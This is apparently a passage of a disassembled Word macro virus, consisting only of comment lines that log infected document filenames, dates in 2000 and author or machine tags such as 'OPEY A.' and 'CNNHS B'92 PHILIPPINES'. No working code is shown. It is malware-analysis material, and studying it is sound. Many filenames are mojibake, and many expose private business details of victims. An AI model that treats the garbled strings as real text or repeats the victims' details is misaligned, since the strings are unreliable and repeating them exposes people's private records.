' Line #1278:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1279:
' 	QuoteRem 0x0000 0x000D " 무鱇淃커.doc"
' Line #1280:
' Line #1281:
' 	QuoteRem 0x0000 0x000A " 눈廬a.doc"
' Line #1282:
' Line #1283:
' 	QuoteRem 0x0000 0x000A " POEMS.doc"
' Line #1284:
' Line #1285:
' 	QuoteRem 0x0000 0x000A " SONGS.doc"
' Line #1286:
' Line #1287:
' 	QuoteRem 0x0000 0x000D " 눈廬痰笭.doc"
' Line #1288:
' Line #1289:
' 	QuoteRem 0x0000 0x0009 " 눈廬.doc"
' Line #1290:
' Line #1291:
' 	QuoteRem 0x0000 0x000A " SHNEW.DOC"
' Line #1292:
' Line #1293:
' 	QuoteRem 0x0000 0x001D " 劤쉔 Microsoft Word 匡도.doc"
' Line #1294:
' Line #1295:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1296:
' Line #1297:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1298:
' Line #1299:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1300:
' Line #1301:
' 	QuoteRem 0x0000 0x0017 " 뛔뽕嵐忌눈股밤셕뺍.doc"
' Line #1302:
' Line #1303:
' 	QuoteRem 0x0000 0x0006 " 1.doc"
' Line #1304:
' Line #1305:
' 	QuoteRem 0x0000 0x0019 " 뛔뽕柯욀論減嵐劤壙멨.doc"
' Line #1306:
' Line #1307:
' 	QuoteRem 0x0000 0x0015 " 뛔뽕論減嵐劤壙멨.doc"
' Line #1308:
' Line #1309:
' 	QuoteRem 0x0000 0x0013 " 뛔뽕嵐暠튬綱츠.doc"
' Line #1310:
' Line #1311:
' 	QuoteRem 0x0000 0x000D " 삔셕齡똑.doc"
' Line #1312:
' Line #1313:
' 	QuoteRem 0x0000 0x000B " 쯩숯텬.doc"
' Line #1314:
' Line #1315:
' 	QuoteRem 0x0000 0x0006 " 匡도2"
' Line #1316:
' Line #1317:
' 	QuoteRem 0x0000 0x001D " 뛔뽕論減嵐忌눈股밤롤渡炬.doc"
' Line #1318:
' Line #1319:
' 	QuoteRem 0x0000 0x000D " 理줏북谿.doc"
' Line #1320:
' Line #1321:
' 	QuoteRem 0x0000 0x0006 " 匡도3"
' Line #1322:
' Line #1323:
' 	QuoteRem 0x0000 0x0006 " 匡도2"
' Line #1324:
' Line #1325:
' 	QuoteRem 0x0000 0x000C " 葵累蝎1.doc"
' Line #1326:
' Line #1327:
' 	QuoteRem 0x0000 0x000A " 葵累1.doc"
' Line #1328:
' Line #1329:
' 	QuoteRem 0x0000 0x000C " 匡숭001.doc"
' Line #1330:
' Line #1331:
' 	QuoteRem 0x0000 0x000F " 櫓벌뛔뽕멨.doc"
' Line #1332:
' Line #1333:
' 	QuoteRem 0x0000 0x000B " 男헝변.doc"
' Line #1334:
' Line #1335:
' 	QuoteRem 0x0000 0x001D " 劤쉔 Microsoft Word 匡도.doc"
' Line #1336:
' Line #1337:
' 	QuoteRem 0x0000 0x000F " 桿쬠쉴溪具.doc"
' Line #1338:
' Line #1339:
' 	QuoteRem 0x0000 0x000D " 拱콘츰튬.doc"
' Line #1340:
' Line #1341:
' 	QuoteRem 0x0000 0x0007 " JL.doc"
' Line #1342:
' Line #1343:
' 	QuoteRem 0x0000 0x0023 " 08:07:11 PM -Wednesday,21 Jun,2000"
' Line #1344:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #1345:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #1346:
' 	QuoteRem 0x0000 0x0007 " JL.doc"
' Line #1347:
' Line #1348:
' 	QuoteRem 0x0000 0x000B " Cjl-jl.doc"
' Line #1349:
' Line #1350:
' 	QuoteRem 0x0000 0x0009 " 숌저.doc"
' Line #1351:
' Line #1352:
' 	QuoteRem 0x0000 0x000F " 몸 훙숌 저.doc"
' Line #1353:
' Line #1354:
' 	QuoteRem 0x0000 0x0010 " 숌저2（亶）.doc"
' Line #1355:
' Line #1356:
' 	QuoteRem 0x0000 0x000A " 숌저2.doc"
' Line #1357:
' Line #1358:
' 	QuoteRem 0x0000 0x000C " 숌저(1).doc"
' Line #1359:
' Line #1360:
' 	QuoteRem 0x0000 0x0016 " 몸   훙   숌   저.doc"
' Line #1361:
' Line #1362:
' 	QuoteRem 0x0000 0x0010 " 몸훙숌저(1).doc"
' Line #1363:
' Line #1364:
' 	QuoteRem 0x0000 0x0010 " 몸훙숌저(2).doc"
' Line #1365:
' Line #1366:
' 	QuoteRem 0x0000 0x0009 " 땟儺.doc"
' Line #1367:
' Line #1368:
' 	QuoteRem 0x0000 0x000B " 헹斂변.DOC"
' Line #1369:
' Line #1370:
' 	QuoteRem 0x0000 0x0009 " 꽐깝.doc"
' Line #1371:
' Line #1372:
' 	QuoteRem 0x0000 0x0015 " 땜꼬뺏欺-붚-璂송.doc"
' Line #1373:
' Line #1374:
' 	QuoteRem 0x0000 0x000E " 있記-璂송.doc"
' Line #1375:
' Line #1376:
' 	QuoteRem 0x0000 0x0009 " Doc1.doc"
' Line #1377:
' Line #1378:
' 	QuoteRem 0x0000 0x000F " qxzd0617-2.doc"
' Line #1379:
' Line #1380:
' 	QuoteRem 0x0000 0x000F " qxzd0131-2.doc"
' Line #1381:
' Line #1382:
' 	QuoteRem 0x0000 0x001B " 벴있莖5%EC桿駱와빵츰쩌.doc"
' Line #1383:
' Line #1384:
' 	QuoteRem 0x0000 0x0023 " 덮땜뒈혐벴있莖饋簡듐섟彊逕헙워.doc"
' Line #1385:
' Line #1386:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM021.doc"
' Line #1387:
' Line #1388:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM027.doc"
' Line #1389:
' Line #1390:
' 	QuoteRem 0x0000 0x0020 " 11:02:09 AM -Tuesday,4 Jul,2000"
' Line #1391:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #1392:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #1393:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM038.doc"
' Line #1394:
' Line #1395:
' 	QuoteRem 0x0000 0x000D " 와빵츰쩌.doc"
' Line #1396:
' Line #1397:
' 	QuoteRem 0x0000 0x000C " ZHANGYI.doc"
' Line #1398:
' Line #1399:
' 	QuoteRem 0x0000 0x0017 " 璂송-땜꼬-빤켓낀��.doc"
' Line #1400:
' Line #1401:
' 	QuoteRem 0x0000 0x000C " ZDCH003.doc"
' Line #1402:
' Line #1403:
' 	QuoteRem 0x0000 0x0017 " 璂송-땜꼬-�紬⒜���.doc"
' Line #1404:
' Line #1405:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1406:
' Line #1407:
' 	QuoteRem 0x0000 0x000F " 놔뀌괩멩05.doc"
' Line #1408:
' Line #1409:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1410:
' Line #1411:
' 	QuoteRem 0x0000 0x000D " 묏鱗휑션.doc"
' Line #1412:
' Line #1413:
' 	QuoteRem 0x0000 0x0012 " 璂송-멕錟陶땜.doc"
' Line #1414:
' Line #1415:
' 	QuoteRem 0x0000 0x0013 " 堵츰鬧꿍북谿蝎.doc"
' Line #1416:
' Line #1417:
' 	QuoteRem 0x0000 0x0011 " 堵츰밗잿츰쩌.doc"
' Line #1418:
' Line #1419:
' 	QuoteRem 0x0000 0x0011 " 마운饋簡헙워.doc"
' Line #1420:
' Line #1421:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM002.doc"
' Line #1422:
' Line #1423:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM034.doc"
' Line #1424:
' Line #1425:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM006.doc"
' Line #1426:
' Line #1427:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM001.doc"
' Line #1428:
' Line #1429:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1430:
' Line #1431:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1432:
' Line #1433:
' 	QuoteRem 0x0000 0x000C " zwl우쌥.doc"
' Line #1434:
' Line #1435:
' 	QuoteRem 0x0000 0x000D " qxzd0003.doc"
' Line #1436:
' Line #1437:
' 	QuoteRem 0x0000 0x000F " qxzd0117-1.doc"
' Line #1438:
' Line #1439:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM001.doc"
' Line #1440:
' Line #1441:
' 	QuoteRem 0x0000 0x000A " 匡도2.doc"
' Line #1442:
' Line #1443:
' 	QuoteRem 0x0000 0x000E " 覩죕와빵0.doc"
' Line #1444:
' Line #1445:
' 	QuoteRem 0x0000 0x000E " 覩죕와빵1.doc"
' Line #1446:
' Line #1447:
' 	QuoteRem 0x0000 0x000B " yp0004.doc"
' Line #1448:
' Line #1449:
' 	QuoteRem 0x0000 0x000B " 99적樓.doc"
' Line #1450:
' Line #1451:
' 	QuoteRem 0x0000 0x0011 " 2000YPWT-004.doc"
' Line #1452:
' Line #1453:
' 	QuoteRem 0x0000 0x000A " F1233.doc"
' Line #1454:
' Line #1455:
' 	QuoteRem 0x0000 0x000C " ZDCH004.doc"
' Line #1456:
' Line #1457:
' 	QuoteRem 0x0000 0x000D " 놔뀌괩00.doc"
' Line #1458:
' Line #1459:
' 	QuoteRem 0x0000 0x0023 " 嗜든넥覩꼼죕와빵츰데(�諧邂㏈�).doc"
' Line #1460:
' Line #1461:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1462:
' Line #1463:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM039.doc"
' Line #1464:
' Line #1465:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM003.doc"
' Line #1466:
' Line #1467:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM004.doc"
' Line #1468:
' Line #1469:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM005.doc"
' Line #1470:
' Line #1471:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM007.doc"
' Line #1472:
' Line #1473:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM008.doc"
' Line #1474:
' Line #1475:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM009.doc"
' Line #1476:
' Line #1477:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM010.doc"
' Line #1478:
' Line #1479:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM011.doc"
' Line #1480:
' Line #1481:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM012.doc"
' Line #1482:
' Line #1483:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM013.doc"
' Line #1484:
' Line #1485:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM014.doc"
' Line #1486:
' Line #1487:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM015.doc"
' Line #1488:
' Line #1489:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM016.doc"
' Line #1490:
' Line #1491:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM017.doc"
' Line #1492:
' Line #1493:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM018.doc"
' Line #1494:
' Line #1495:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM019.doc"
' Line #1496:
' Line #1497:
' 	QuoteRem 0x0000 0x000A " F1233.doc"
' Line #1498:
' Line #1499:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM020.doc"
' Line #1500:
' Line #1501:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1502:
' Line #1503:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM021.doc"
' Line #1504:
' Line #1505:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM020.doc"
' Line #1506:
' Line #1507:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM022.doc"
' Line #1508:
' Line #1509:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM023.doc"
' Line #1510:
' Line #1511:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM024.doc"
' Line #1512:
' Line #1513:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM025.doc"
' Line #1514:
' Line #1515:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM026.doc"
' Line #1516:
' Line #1517:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM027.doc"
' Line #1518:
' Line #1519:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM028.doc"
' Line #1520:
' Line #1521:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM031.doc"
' Line #1522:
' Line #1523:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM032.doc"
' Line #1524:
' Line #1525:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM035.doc"
' Line #1526:
' Line #1527:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM036.doc"
' Line #1528:
' Line #1529:
' 	QuoteRem 0x0000 0x0011 " 2000TW-BM037.doc"
' Line #1530:
' Line #1531:
' 	QuoteRem 0x0000 0x0011 " 2000YPWT-001.doc"
' Line #1532:
' Line #1533:
' 	QuoteRem 0x0000 0x0011 " 2000YPWT-002.doc"
' Line #1534:
' Line #1535:
' 	QuoteRem 0x0000 0x000F " qxzd0709-1.doc"
' Line #1536:
' Line #1537:
' 	QuoteRem 0x0000 0x000C " 壇   틘.doc"
' Line #1538:
' Line #1539:
' 	QuoteRem 0x0000 0x000A " F1233.doc"
' Line #1540:
' Line #1541:
' 	QuoteRem 0x0000 0x000E " 눈廬목駕2.doc"
' Line #1542:
' Line #1543:
' 	QuoteRem 0x0000 0x001E " 98'푠擧嗜든넥契撚50퓻탤츰.doc"
' Line #1544:
' Line #1545:
' 	QuoteRem 0x0000 0x001D " 琅뵀멩列（꿇틤）莖냥든켬.doc"
' Line #1546:
' Line #1547:
' 	QuoteRem 0x0000 0x000C " 壇   틘.doc"
' Line #1548:
' Line #1549:
' 	QuoteRem 0x0000 0x001E " 璂송-땜꼬-빤켓베적zhuzhou.doc"
' Line #1550:
' Line #1551:
' 	QuoteRem 0x0000 0x000F " qxzd0710-2.doc"
' Line #1552:
' Line #1553:
' 	QuoteRem 0x0000 0x000D " F1233(1).doc"
' Line #1554:
' Line #1555:
' 	QuoteRem 0x0000 0x000E " E20000517.doc"
' Line #1556:
' Line #1557:
' 	QuoteRem 0x0000 0x0017 " RESUME(TaiweiBJ2t).doc"
' Line #1558:
' Line #1559:
' 	QuoteRem 0x0000 0x001E " jianlicstarwq(TaiweiBJ2t).doc"
' Line #1560:
' Line #1561:
' 	QuoteRem 0x0000 0x000D " 몸훙숌썽.doc"
' Line #1562:
' Line #1563:
' 	QuoteRem 0x0000 0x001E " 嗜든넥覩꼼죕淃커롸驕괩멩1.doc"
' Line #1564:
' Line #1565:
' 	QuoteRem 0x0000 0x000F " qxzd0711-1.doc"
' Line #1566:
' Line #1567:
' 	QuoteRem 0x0000 0x000F " qxzd0711-2.doc"
' Line #1568:
' Line #1569:
' 	QuoteRem 0x0000 0x0018 " LG 든넥쵱룐痰瀾북셉.doc"
' Line #1570:
' Line #1571:
' 	QuoteRem 0x0000 0x000B " yp0001.doc"
' Line #1572:
' Line #1573:
' 	QuoteRem 0x0000 0x000F " qxzd0711-2.doc"
' Line #1574:
' Line #1575:
' 	QuoteRem 0x0000 0x000F " qxzd0711-1.doc"
' Line #1576:
' Line #1577:
' 	QuoteRem 0x0000 0x000F " qxzd0712-1.doc"
' Line #1578:
' Line #1579:
' 	QuoteRem 0x0000 0x000C " 숌저ZHR.doc"
' Line #1580:
' Line #1581:
' 	QuoteRem 0x0000 0x000D " qxzd0000.doc"
' Line #1582:
' Line #1583:
' 	QuoteRem 0x0000 0x000D " 饋簡롤痰.doc"
' Line #1584:
' Line #1585:
' 	QuoteRem 0x0000 0x0013 " 눈廬庫（크浪）.doc"
' Line #1586:
' Line #1587:
' 	QuoteRem 0x0000 0x000D " qxzd0713.doc"
' Line #1588:
' Line #1589:
' 	QuoteRem 0x0000 0x0014 " 눈廬庫（크浪）1.doc"
' Line #1590:
' Line #1591:
' 	QuoteRem 0x0000 0x000F " 98묩죕츠玖.doc"
' Line #1592:
' Line #1593:
' 	QuoteRem 0x0000 0x000E " 헹斂변(1).DOC"
' Line #1594:
' Line #1595:
' 	QuoteRem 0x0000 0x000F " ZHANGYI(1).doc"
' Line #1596:
' Line #1597:
' 	QuoteRem 0x0000 0x000F " 壇   틘(1).doc"
' Line #1598:
' Line #1599:
' 	QuoteRem 0x0000 0x000A " henry.doc"
' Line #1600:
' Line #1601:
' 	QuoteRem 0x0000 0x0009 " job1.doc"
' Line #1602:
' Line #1603:
' 	QuoteRem 0x0000 0x0013 " 벴있莖냥굶셕炬.doc"
' Line #1604:
' Line #1605:
' 	QuoteRem 0x0000 0x0013 " 벴있莖냥굶셕炬.doc"
' Line #1606:
' Line #1607:
' 	QuoteRem 0x0000 0x0012 " 莖북谿섈주001.doc"
' Line #1608:
' Line #1609:
' 	QuoteRem 0x0000 0x0017 " 벴있莖마운饋簡헙워.doc"
' Line #1610:
' Line #1611:
' 	QuoteRem 0x0000 0x0011 " 벴있莖5%芎푯.doc"
' Line #1612:
' Line #1613:
' 	QuoteRem 0x0000 0x0015 " 벴있莖냥굶셕炬깊.doc"
' Line #1614:
' Line #1615:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1616:
' Line #1617:
' 	QuoteRem 0x0000 0x000E " 놔뀌셕뺍3.doc"
' Line #1618:
' Line #1619:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1620:
' Line #1621:
' 	QuoteRem 0x0000 0x0008 " ADD.doc"
' Line #1622:
' Line #1623:
' 	QuoteRem 0x0000 0x000D " 무鱇숌썽.doc"
' Line #1624:
' Line #1625:
' 	QuoteRem 0x0000 0x0008 " JXC.DOC"
' Line #1626:
' Line #1627:
' 	QuoteRem 0x0000 0x000B " 菱수깊.doc"
' Line #1628:
' Line #1629:
' 	QuoteRem 0x0000 0x000C " 菱수깊1.doc"
' Line #1630:
' Line #1631:
' 	QuoteRem 0x0000 0x0014 " 눈廬庫（크浪）1.doc"
' Line #1632:
' Line #1633:
' 	QuoteRem 0x0000 0x0013 " 琅운멩列(格契).doc"
' Line #1634:
' Line #1635:
' 	QuoteRem 0x0000 0x000F " 놔뀌괩멩04.doc"
' Line #1636:
' Line #1637:
' 	QuoteRem 0x0000 0x000F " 놔뀌괩멩03.doc"
' Line #1638:
' Line #1639:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1640:
' Line #1641:
' 	QuoteRem 0x0000 0x0006 " 匡도2"
' Line #1642:
' Line #1643:
' 	QuoteRem 0x0000 0x001F " 2000벴있槿섈좼饋簡寧응깊01.doc"
' Line #1644:
' Line #1645:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1646:
' Line #1647:
' 	QuoteRem 0x0000 0x0015 " 벴있莖롸토렘갭01.doc"
' Line #1648:
' Line #1649:
' 	QuoteRem 0x0000 0x0017 " 벴있莖饋簡마운헙워.doc"
' Line #1650:
' Line #1651:
' 	QuoteRem 0x0000 0x000D " 꼿蛟슥쌈.doc"
' Line #1652:
' Line #1653:
' 	QuoteRem 0x0000 0x000D " 와빵츰쩌.doc"
' Line #1654:
' Line #1655:
' 	QuoteRem 0x0000 0x0014 " 99njing놔뀌괩멩.doc"
' Line #1656:
' Line #1657:
' 	QuoteRem 0x0000 0x000A " XHW04.doc"
' Line #1658:
' Line #1659:
' 	QuoteRem 0x0000 0x0013 " 벴있槿돨먁剋斤.doc"
' Line #1660:
' Line #1661:
' 	QuoteRem 0x0000 0x000E " JLI헙워-1.doc"
' Line #1662:
' Line #1663:
' 	QuoteRem 0x0000 0x0009 " 붚질.doc"
' Line #1664:
' Line #1665:
' 	QuoteRem 0x0000 0x0011 " XFZH98구戈쩌.doc"
' Line #1666:
' Line #1667:
' 	QuoteRem 0x0000 0x0023 " 벴있槿98쾨뒀갛탤（ FAX�均ㅒ샬�.doc"
' Line #1668:
' Line #1669:
' 	QuoteRem 0x0000 0x0011 " 2000묏鱗셕뺍.doc"
' Line #1670:
' Line #1671:
' 	QuoteRem 0x0000 0x0015 " 2000쾨놔뀌괩멩01.doc"
' Line #1672:
' Line #1673:
' 	QuoteRem 0x0000 0x0013 " 2000쾨놔뀌셕뺍.doc"
' Line #1674:
' Line #1675:
' 	QuoteRem 0x0000 0x000F " 놔뀌셕뺍03.doc"
' Line #1676:
' Line #1677:
' 	QuoteRem 0x0000 0x000D " 놔뀌셕뺍.doc"
' Line #1678:
' Line #1679:
' 	QuoteRem 0x0000 0x000A " 匡도2.doc"
' Line #1680:
' Line #1681:
' 	QuoteRem 0x0000 0x000F " 놔뀌괩멩01.doc"
' Line #1682:
' Line #1683:
' 	QuoteRem 0x0000 0x000D " 묏鱗鋼쨌.doc"
' Line #1684:
' Line #1685:
' 	QuoteRem 0x0000 0x0015 " palm廊�溝穎逃㉫�.doc"
' Line #1686:
' Line #1687:
' 	QuoteRem 0x0000 0x0015 " 벴있莖茄駱葵累01.doc"
' Line #1688:
' Line #1689:
' 	QuoteRem 0x0000 0x0015 " 벴있莖茄駱葵累02.doc"
' Line #1690:
' Line #1691:
' 	QuoteRem 0x0000 0x000D " 섈주桿駱.doc"
' Line #1692:
' Line #1693:
' 	QuoteRem 0x0000 0x0023 " 덮땜뒈혐벴있莖饋簡듐섟彊逕헙워.doc"
' Line #1694:
' Line #1695:
' 	QuoteRem 0x0000 0x0017 " 밤멩갛탤-2000좼퀼1.doc"
' Line #1696:
' Line #1697:
' 	QuoteRem 0x0000 0x000D " 밤멩갛탤.doc"
' Line #1698:
' Line #1699:
' 	QuoteRem 0x0000 0x0017 " 2000쾨밤멩갛탤헙워.doc"
' Line #1700:
' Line #1701:
' 	QuoteRem 0x0000 0x0021 " 2000벴있槿붚질쉭饋簡寧응깊01.doc"
' Line #1702:
' Line #1703:
' 	QuoteRem 0x0000 0x0013 " 벴있莖롸토렘갭.doc"
' Line #1704:
' Line #1705:
' 	QuoteRem 0x0000 0x000D " ~WRD0002.tmp"
' Line #1706:
' Line #1707:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1708:
' Line #1709:
' 	QuoteRem 0x0000 0x0009 " cute.doc"
' Line #1710:
' Line #1711:
' 	QuoteRem 0x0000 0x000A " PRICE.DOC"
' Line #1712:
' Line #1713:
' 	QuoteRem 0x0000 0x0006 " 匡도2"
' Line #1714:
' Line #1715:
' 	QuoteRem 0x0000 0x0011 " 2000쾨繫祇쩌.doc"
' Line #1716:
' Line #1717:
' 	QuoteRem 0x0000 0x0013 " 묏鱗슥쌈섟悧써.doc"
' Line #1718:
' Line #1719:
' 	QuoteRem 0x0000 0x000D " 揭郭�俓�.doc"
' Line #1720:
' Line #1721:
' 	QuoteRem 0x0000 0x0006 " 匡도1"
' Line #1722:
' Line #1723:
' 	QuoteRem 0x0000 0x000F " 珙엌尿묏鱗.doc"
' Line #1724:
' Line #1725:
' 	QuoteRem 0x0000 0x000D " 몸훙숌저.doc"
' Line #1726:
' Line #1727:
' 	QuoteRem 0x0000 0x0021 " 12:00:34 오후 -Friday,1 Sep,2000"
' Line #1728:
' 	QuoteRem 0x0000 0x0009 " Hanjung4"
' Line #1729:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1730:
' 	QuoteRem 0x0000 0x000B " 이력서.doc"
' Line #1731:
' Line #1732:
' 	QuoteRem 0x0000 0x0009 " 0822.doc"
' Line #1733:
' Line #1734:
' 	QuoteRem 0x0000 0x0009 " 0901.doc"
' Line #1735:
' Line #1736:
' 	QuoteRem 0x0000 0x000A "  人  .doc"
' Line #1737:
' Line #1738:
' 	QuoteRem 0x0000 0x001B " 벴벌路묏撚瓏駕삔�煐識�.doc"
' Line #1739:
' Line #1740:
' 	QuoteRem 0x0000 0x001B " 벴벌路묏撚瓏駕삔�煐識�.doc"
' Line #1741:
' Line #1742:
' 	QuoteRem 0x0000 0x000E " 8월보고서.doc"
' Line #1743:
' Line #1744:
' 	QuoteRem 0x0000 0x0009 " 0904.doc"
' Line #1745:
' Line #1746:
' 	QuoteRem 0x0000 0x000F " 현금수표01.doc"
' Line #1747:
' Line #1748:
' 	QuoteRem 0x0000 0x0009 " 0831.doc"
' Line #1749:
' Line #1750:
' 	QuoteRem 0x0000 0x0006 " 문서1"
' Line #1751:
' Line #1752:
' 	QuoteRem 0x0000 0x000D " 차량구입.doc"
' Line #1753:
' Line #1754:
' 	QuoteRem 0x0000 0x0009 " 0905.doc"
' Line #1755:
' Line #1756:
' 	QuoteRem 0x0000 0x0009 " 0906.doc"
' Line #1757:
' Line #1758:
' 	QuoteRem 0x0000 0x0023 " 08:39:13 오후 -Thursday,7 Sep,2000"
' Line #1759:
' 	QuoteRem 0x0000 0x0008 " OPEY A."
' Line #1760:
' 	QuoteRem 0x0000 0x001E " CNNHS B'92 PHILIPPINES (CNSC)"
' Line #1761:
' 	QuoteRem 0x0000 0x0009 " 0906.doc"
' Line #1762:
' Line #1763:
' 	QuoteRem 0x0000 0x000F " 근태보고서.doc"
' Line #1764:
' Line #1765:
' 	QuoteRem 0x0000 0x001C " 하노이지점 본사보고 (2).doc"
' Line #1766:
' Line #1767:
' 	QuoteRem 0x0000 0x0012 " 일일보고2 (2).doc"
' Line #1768:
' Line #1769:
' 	QuoteRem 0x0000 0x0014 " facsimile(영문).doc"
' Line #1770:
' Line #1771:
' 	QuoteRem 0x0000 0x0014 " 당지점 업무분장.doc"
' Line #1772:
' Line #1773:
' 	QuoteRem 0x0000 0x0017 " 경쟁사정보입수관련.doc"
' Line #1774:
' Line #1775:
' 	QuoteRem 0x0000 0x0013 " 사인사용신청서.doc"
' Line #1776:
' Line #1777:
' 	QuoteRem 0x0000 0x001D " 첨부--우리사주-청약-안내.doc"
' Line #1778:
' Line #1779:
' 	QuoteRem 0x0000 0x0012 " 일일보고2 (4).doc"
' Line #1780:
' Line #1781:
' 	QuoteRem 0x0000 0x0021 " 00년추석연휴복지시설운영계획.doc"
' Line #1782:
' Line #1783:
' 	QuoteRem 0x0000 0x0016 " 일일 본사보고 (9).doc"
' Line #1784:
' Line #1785:
' 	QuoteRem 0x0000 0x0017 " 일일 본사보고 (10).doc"
' Line #1786:
' Line #1787:
' 	QuoteRem 0x0000 0x0017 " 일일 본사보고 (11).doc"
' Line #1788:
' Line #1789:
' 	QuoteRem 0x0000 0x0015 " Daily Report (9).doc"
' Line #1790:
' Line #1791:
' 	QuoteRem 0x0000 0x0015 " Daily Report (9).doc"
' Line #1792:
' Line #1793:
' 	QuoteRem 0x0000 0x0009 " 0915.doc"
' Line #1794:
' Line #1795:
' 	QuoteRem 0x0000 0x0009 " 0917.doc"
' Line #1796:
' Line #1797:
' 	QuoteRem 0x0000 0x0012 " 일일보고2 (7).doc"
' Line #1798:
' Line #1799:
' 	QuoteRem 0x0000 0x001A " 우리사주청약-긴급파악.doc"
' Line #1800:
' Line #1801:
' 	QuoteRem 0x0000 0x000D " 0918 (1).doc"
' Line #1802:
' Line #1803:
' 	QuoteRem 0x0000 0x000C " 332-134.doc"
' Line #1804:
' Line #1805:
' 	QuoteRem 0x0000 0x000C " 332-131.doc"
' Line #1806:
' Line #1807:
' 	QuoteRem 0x0000 0x000D " 0920 (1).doc"
' Line #1808:
' Line #1809:
' 	QuoteRem 0x0000 0x001F " (긴급)우리사주주식배정현황.doc"
' Line #1810:
' Line #1811:
' 	QuoteRem 0x0000 0x000A " 필기2.doc"
' Line #1812:
' Line #1813:
' 	QuoteRem 0x0000 0x000D " 0921 (1).doc"
' Line #1814:
' Line #1815:
' 	QuoteRem 0x0000 0x000A " 필기2.doc"
' Line #1816:
' Line #1817:
' 	QuoteRem 0x0000 0x0021 " 우리사주-개인별-최종배정현황.doc"
' Line #1818:
' Line #1819:
' 	QuoteRem 0x0000 0x0016 " Daily Report (17).doc"
' Line #1820:
' Line #1821:
' 	QuoteRem 0x0000 0x000D " 0922 (1).doc"
' Line #1822:
' Line #1823:
' 	QuoteRem 0x0000 0x0011 " 해외급여주소.doc"
' Line #1824:
' Line #1825:
' 	QuoteRem 0x0000 0x0017 " 일일 본사보고 (12).doc"
' Line #1826:
' Line #1827:
' 	QuoteRem 0x0000 0x000D " 0925 (1).doc"
' Line #1828:
' Line #1829:
' 	QuoteRem 0x0000 0x0012 " 일일보고2 (9).doc"
' Line #1830:
' Line #1831:
' 	QuoteRem 0x0000 0x0025 " 내연발전PM-부고(진철규과장-부친).doc"
' Line #1832:
' Line #1833:
' 	QuoteRem 0x0000 0x001E " 부고(원자력QC-정동부반장).doc"
' Line #1834:
' Line #1835:
' 	QuoteRem 0x0000 0x0016 " 체육대회관련-근태.doc"
' Line #1836:
' Line #1837:
' 	QuoteRem 0x0000 0x0016 " DAILY REPORT (21).doc"
' Line #1838:
' Line #1839:
' 	QuoteRem 0x0000 0x0013 " 일일보고2 (12).doc"
' Line #1840:
' Line #1841:
' 	QuoteRem 0x0000 0x000D " 1005 (1).doc"
' Line #1842:
' Line #1843:
' 	QuoteRem 0x0000 0x0010 " p.t hanjung.doc"
' Line #1844:
' Line #1845:
' 	QuoteRem 0x0000 0x0012 " 일일 본사보고.doc"
' Line #1846:
' Line #1847:
' 	QuoteRem 0x0000 0x0021 " 04:32:55 오후 -Friday,6 Oct,2000"
' Line #1848:
' 	QuoteRem 0x0000 0x0005 " 한중"
' Line #1849:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1850:
' 	QuoteRem 0x0000 0x0012 " 일일 본사보고.doc"
' Line #1851:
' Line #1852:
' 	QuoteRem 0x0000 0x000E " FAX(영문).doc"
' Line #1853:
' Line #1854:
